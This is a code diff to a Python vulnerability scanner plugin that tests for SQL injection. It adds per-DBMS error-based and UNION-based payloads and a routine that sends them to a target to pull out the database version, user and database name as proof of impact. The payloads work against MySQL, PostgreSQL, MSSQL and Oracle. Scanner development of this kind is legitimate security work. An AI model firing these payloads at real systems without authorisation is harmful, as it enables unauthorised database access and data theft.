@@ -13,6 +13,7 @@ CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
 """
 
 import logging
+import re
 import time
 from typing import Dict, List, Any, Optional, Tuple
 from urllib.parse import urlparse, parse_qs, urlencode
@@ -136,6 +137,55 @@ _REMEDIATION = (
     "Validate and sanitize all user-supplied input. Consider using an ORM. "
     "Deploy a WAF as an additional layer of defense."
 )
+
+# ---------------------------------------------------------------------------
+# Data extraction payloads per DBMS
+# ---------------------------------------------------------------------------
+
+# Error-based extraction: coerce data into DBMS error messages
+_EXTRACTION_ERROR_PAYLOADS: Dict[str, List[str]] = {
+    'MySQL': [
+        "' AND extractvalue(1,concat(0x7e,VERSION(),0x7e,USER(),0x7e,DATABASE()))--",
+        "' AND updatexml(1,concat(0x7e,VERSION(),0x7e,USER(),0x7e,DATABASE()),1)--",
+        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,USER(),0x3a,DATABASE(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+    ],
+    'PostgreSQL': [
+        "' AND CAST(version() AS INTEGER)--",
+        "' AND 1=CAST(version()||':'||current_user||':'||current_database() AS INTEGER)--",
+    ],
+    'MSSQL': [
+        "' AND 1=CONVERT(INT,@@version)--",
+        "' AND 1=CONVERT(INT,DB_NAME()+':'+SYSTEM_USER+':'+HOST_NAME())--",
+    ],
+    'Oracle': [
+        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
+        "' AND 1=(SELECT TO_NUMBER(banner) FROM v$version WHERE ROWNUM=1)--",
+    ],
+    'Generic': [
+        "' AND extractvalue(1,concat(0x7e,VERSION()))--",
+        "' AND 1=CONVERT(INT,@@version)--",
+        "' AND CAST(version() AS INTEGER)--",
+    ],
+}
+
+# UNION-based extraction placeholders; %s is replaced with NULL-padded SELECT
+_UNION_EXTRACTION_TEMPLATES = [
+    "VERSION()",
+    "USER()",
+    "DATABASE()",
+    "@@hostname",
+    "version()",
+    "current_user",
+    "current_database()",
+    "DB_NAME()",
+]
+
+# Patterns to extract data from error messages or UNION output
+_EXTRACTION_RESULT_PATTERNS = [
+    r'~([^~]+)~',                             # extractvalue / updatexml marker
+    r'XPATH syntax error:\s*[\'"]([^\'"]+)',   # MySQL extractvalue error
+    r'Duplicate entry\s+[\'"]([^\'"]+)',        # MySQL duplicate entry
+]
 
 
 class SQLiScannerPlugin(BaseScanPlugin):
@@ -309,25 +359,56 @@ class SQLiScannerPlugin(BaseScanPlugin):
             for dbms, patterns in _SQL_ERROR_PATTERNS.items():
                 for pattern in patterns:
                     if pattern in body_lower:
+                        # Attempt data extraction to provide PoC evidence
+                        extracted = self._attempt_data_extraction(
+                            url, method, param, all_params, verify_ssl, timeout,
+                            technique='error', dbms=dbms
+                        )
+                        if extracted:
+                            confidence = 0.99
+                            verified = True
+                            evidence = (
+                                f'Parameter: {param!r} | Method: {method} | '
+                                f'Payload: {payload!r} | '
+                                f'Error pattern matched: {pattern!r} | '
+                                f'DBMS: {dbms} | '
+                                f'Extracted data: {extracted}'
+                            )
+                            description = (
+                                f'SQL injection (error-based) detected in parameter "{param}". '
+                                f'DBMS error pattern for {dbms} was triggered. '
+                                f'Data extraction confirmed: {extracted}. '
+                                'Attack scenario: An attacker can read the database version, '
+                                'user, schema names, and table data directly from error messages.'
+                            )
+                        else:
+                            confidence = 0.90
+                            verified = True
+                            evidence = (
+                                f'Parameter: {param!r} | Method: {method} | '
+                                f'Payload: {payload!r} | '
+                                f'Error pattern matched: {pattern!r} | '
+                                f'DBMS: {dbms} | '
+                                f'Data extraction: not confirmed (manual PoC required)'
+                            )
+                            description = (
+                                f'SQL injection (error-based) detected in parameter "{param}". '
+                                f'DBMS error pattern for {dbms} was triggered. '
+                                'Attack scenario: An attacker can potentially extract database '
+                                'contents. Provide a PoC that extracts database name/version '
+                                'to confirm impact.'
+                            )
                         return VulnerabilityFinding(
                             vulnerability_type='sqli',
                             severity='high',
                             url=url,
-                            description=(
-                                f'SQL injection (error-based) detected in parameter "{param}". '
-                                f'DBMS error pattern for {dbms} was triggered.'
-                            ),
-                            evidence=(
-                                f'Parameter: {param!r} | Method: {method} | '
-                                f'Payload: {payload!r} | '
-                                f'Error pattern matched: {pattern!r} | '
-                                f'DBMS: {dbms}'
-                            ),
+                            description=description,
+                            evidence=evidence,
                             remediation=_REMEDIATION,
                             parameter=param,
-                            confidence=0.90,
+                            confidence=confidence,
                             cwe_id='CWE-89',
-                            verified=True,
+                            verified=verified,
                             successful_payloads=[payload],
                         )
         return None
@@ -484,24 +565,56 @@ class SQLiScannerPlugin(BaseScanPlugin):
                     except Exception:
                         pass
 
+                # Attempt data extraction using the discovered column count
+                extracted = self._attempt_data_extraction(
+                    url, method, param, all_params, verify_ssl, timeout,
+                    technique='union', col_count=col_count
+                )
+                if extracted:
+                    confidence = 0.99
+                    verified = True
+                    evidence = (
+                        f'Parameter: {param!r} | Method: {method} | '
+                        f'Payload: {payload!r} | '
+                        f'Column count: {col_count} | '
+                        f'Response status: {response.status_code} | '
+                        f'Extracted data: {extracted}'
+                    )
+                    description = (
+                        f'SQL injection (UNION-based) detected in parameter "{param}". '
+                        f'UNION SELECT with {col_count} column(s) returned a valid response. '
+                        f'Data extraction confirmed: {extracted}. '
+                        'Attack scenario: An attacker can extract any data from the database '
+                        'including user credentials, sensitive records, and schema information.'
+                    )
+                else:
+                    confidence = 0.75
+                    verified = False
+                    evidence = (
+                        f'Parameter: {param!r} | Method: {method} | '
+                        f'Payload: {payload!r} | '
+                        f'Column count: {col_count} | '
+                        f'Response status: {response.status_code} | '
+                        f'Data extraction: not confirmed (manual PoC required)'
+                    )
+                    description = (
+                        f'SQL injection (UNION-based) detected in parameter "{param}". '
+                        f'UNION SELECT with {col_count} column(s) returned a valid response. '
+                        'Attack scenario: An attacker can potentially extract database contents '
+                        'using UNION SELECT. Provide a PoC extracting database name/version '
+                        'to confirm impact.'
+                    )
                 return VulnerabilityFinding(
                     vulnerability_type='sqli',
                     severity='critical',
                     url=url,
-                    description=(
-                        f'SQL injection (UNION-based) detected in parameter "{param}". '
-                        f'UNION SELECT with {col_count} column(s) returned a valid response.'
-                    ),
-                    evidence=(
-                        f'Parameter: {param!r} | Method: {method} | '
-                        f'Payload: {payload!r} | '
-                        f'Column count: {col_count} | '
-                        f'Response status: {response.status_code}'
-                    ),
+                    description=description,
+                    evidence=evidence,
                     remediation=_REMEDIATION,
                     parameter=param,
-                    confidence=0.75,
+                    confidence=confidence,
                     cwe_id='CWE-89',
+                    verified=verified,
                     successful_payloads=[payload],
                 )
         return None
@@ -509,6 +622,77 @@ class SQLiScannerPlugin(BaseScanPlugin):
     # ------------------------------------------------------------------
     # Helpers
     # ------------------------------------------------------------------
+
+    def _attempt_data_extraction(
+        self,
+        url: str,
+        method: str,
+        param: str,
+        all_params: Dict[str, str],
+        verify_ssl: bool,
+        timeout: int,
+        technique: str = 'error',
+        dbms: str = 'Generic',
+        col_count: int = 1,
+    ) -> Optional[str]:
+        """
+        Attempt to extract database metadata (version, user, database name) via
+        error-based or UNION-based payloads after a confirmed injection point.
+
+        Returns a human-readable string of extracted data (e.g.
+        "Database: mysql 8.0.32 | User: app_user@localhost | DB: production_db")
+        or None if extraction was not possible.
+        """
+        extracted_parts: List[str] = []
+
+        if technique == 'error':
+            payloads = (
+                _EXTRACTION_ERROR_PAYLOADS.get(dbms, [])
+                + _EXTRACTION_ERROR_PAYLOADS.get('Generic', [])
+            )
+            for payload in payloads:
+                test_params = dict(all_params)
+                test_params[param] = payload
+                try:
+                    response = self._send_request(url, method, test_params, verify_ssl, timeout)
+                except Exception:
+                    continue
+                for pat in _EXTRACTION_RESULT_PATTERNS:
+                    matches = re.findall(pat, response.text, re.IGNORECASE)
+                    for match in matches:
+                        match = match.strip()
+                        if match and match not in extracted_parts:
+                            extracted_parts.append(match)
+                if extracted_parts:
+                    break
+
+        elif technique == 'union':
+            # Build UNION SELECT with version/user/db in first available string columns
+            extraction_values = ['VERSION()', 'USER()', 'DATABASE()']
+            for extract_expr in extraction_values:
+                cols = ['NULL'] * col_count
+                # Replace first NULL with extraction expression
+                cols[0] = extract_expr
+                union_payload = f"' UNION SELECT {','.join(cols)}--"
+                test_params = dict(all_params)
+                test_params[param] = all_params.get(param, '1') + union_payload
+                try:
+                    response = self._send_request(url, method, test_params, verify_ssl, timeout)
+                except Exception:
+                    continue
+                # Check for version/user strings in response
+                text = response.text
+                version_match = re.search(
+                    r'\b(\d+\.\d+[\.\d]*(?:-[a-zA-Z0-9._-]+)?)\b', text
+                )
+                if version_match and version_match.group(1) not in extracted_parts:
+                    extracted_parts.append(version_match.group(1))
+
+        if extracted_parts:
+            labels = ['Database version/user/name: ' + ' | '.join(extracted_parts[:5])]
+            return ' | '.join(labels)
+
+        return None
 
     def _send_request(
         self,
